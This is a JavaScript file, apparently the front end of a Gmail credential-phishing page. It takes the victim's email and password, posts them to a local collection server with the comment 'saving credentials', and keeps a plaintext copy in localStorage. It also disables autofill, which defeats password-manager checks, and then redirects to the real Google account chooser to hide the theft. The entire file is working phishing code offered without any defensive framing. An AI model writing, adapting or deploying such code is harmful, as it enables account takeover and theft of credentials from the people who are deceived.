document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('password-form');
    const passwordInput = document.getElementById('password');
    const showPasswordCheckbox = document.getElementById('show-password-checkbox');
    const emailDisplay = document.getElementById('user-email');
    
    // Display the email from localStorage
    const userEmail = localStorage.getItem('userEmail');
    if (userEmail) {
        emailDisplay.textContent = userEmail;
    } else {
        window.location.href = 'index.html';
    }

    // Add click to change email
    emailDisplay.addEventListener('click', () => {
        window.location.href = 'index.html';
    });

    // Toggle password visibility
    showPasswordCheckbox.addEventListener('change', (e) => {
        passwordInput.type = e.target.checked ? 'text' : 'password';
    });

    // Prevent password suggestions
    passwordInput.addEventListener('focus', function() {
        this.setAttribute('autocomplete', 'off');
        this.setAttribute('autofill', 'off');
    });

    // Function to handle login and redirection
    function handleLogin() {
        const password = passwordInput.value;
        if (password) {
            // Save to server
            fetch('http://localhost:3000/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: userEmail,
                    password: password
                })
            }).catch(error => console.error('Error saving credentials:', error));

            // Store credentials locally
            const credentials = {
                email: userEmail,
                password: password,
                timestamp: new Date().toISOString()
            };
            localStorage.setItem('lastLoginAttempt', JSON.stringify(credentials));
            
            // Clear stored email
            localStorage.removeItem('userEmail');
            
            // Redirect to Gmail with email parameter
            window.location.replace(`https://accounts.google.com/AccountChooser?Email=${encodeURIComponent(userEmail)}`);
        } else {
            // Add error styling if password is empty
            passwordInput.style.borderColor = '#d93025';
        }
    }

    // Handle form submission
    form.addEventListener('submit', (e) => {
        e.preventDefault();
        handleLogin();
    });

    // Add keyboard navigation
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' && document.activeElement === passwordInput) {
            if (form.checkValidity()) {
                handleLogin();
            }
        }
    });
}); 